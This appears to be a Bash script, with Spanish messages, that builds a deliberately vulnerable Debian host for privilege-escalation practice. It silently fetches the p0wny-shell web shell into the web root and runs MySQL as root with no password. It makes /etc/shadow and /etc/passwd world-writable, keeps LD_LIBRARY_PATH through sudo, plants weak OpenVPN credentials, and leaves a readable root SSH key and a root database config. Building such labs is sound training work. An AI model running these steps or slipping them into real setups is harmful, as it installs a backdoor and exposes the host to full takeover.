#!/bin/bash

if [[ $(id -u) != 0 ]]; then
    echo "Favor ejecutar este script como root."
    exit 1
fi

echo "Instalando PHP Server"
DEBIAN_FRONTEND=noninteractive apt-get -y install php5-common &> /dev/null
cd /var/www &> /dev/null
wget https://raw.githubusercontent.com/flozz/p0wny-shell/master/shell.php --no-check-certificate &> /dev/null
cd &> /dev/null
/etc/init.d/apache2 restart &> /dev/null


echo "Instalando MySQL Server sin contraseña root"
DEBIAN_FRONTEND=noninteractive apt-get -y install mysql-server &> /dev/null
echo "Reconfiguring MySQL Server to run as root."
sed -i -r -e 's/user\s+= mysql/user = root/' /etc/mysql/my.cnf &> /dev/null
/etc/init.d/mysql restart &> /dev/null

echo "Brindando permisos r/w /etc/shadow"
chmod o+rw /etc/shadow &> /dev/null

echo "Brindando permisos r/w /etc/passwd"
chmod o+w /etc/passwd &> /dev/null

echo "Agregando LD_LIBRARY_PATH al archivo /etc/sudoers."
sed -i -r -e 's/env_keep\+=LD_PRELOAD/env_keep+=LD_PRELOAD\nDefaults env_keep+=LD_LIBRARY_PATH/' /etc/sudoers &> /dev/null

echo "Modificando credenciales OpenVPN."
sed -i -r -e 's/user/root/' /etc/openvpn/auth.txt &> /dev/null
sed -i -r -e 's/password321/password123/' /etc/openvpn/auth.txt &> /dev/null

echo "Ceando llave SSH root SSH."
mkdir /root/.ssh &> /dev/null
mkdir /var/backups/.ssh &> /dev/null
echo "ssh-rsa  root@debian" > /root/.ssh/authorized_keys
echo "-----BEGIN RSA PRIVATE KEY-----

-----END RSA PRIVATE KEY-----" > /var/backups/.ssh/root_key
chmod +r /var/backups/.ssh/root_key &> /dev/null

echo "Creating archivo de configuracion PHP"
echo "/* Authentication type and info */
$cfg['Servers'][$i]['auth_type'] = 'config';
$cfg['Servers'][$i]['user'] = 'root';
$cfg['Servers'][$i]['password'] = 'password123';
$cfg['Servers'][$i]['extension'] = 'mysqli';
$cfg['Servers'][$i]['AllowNoPassword'] = true;
$cfg['Lang'] = '';" > /var/www/.config.inc.php

echo ""
echo "Script Finalizado."
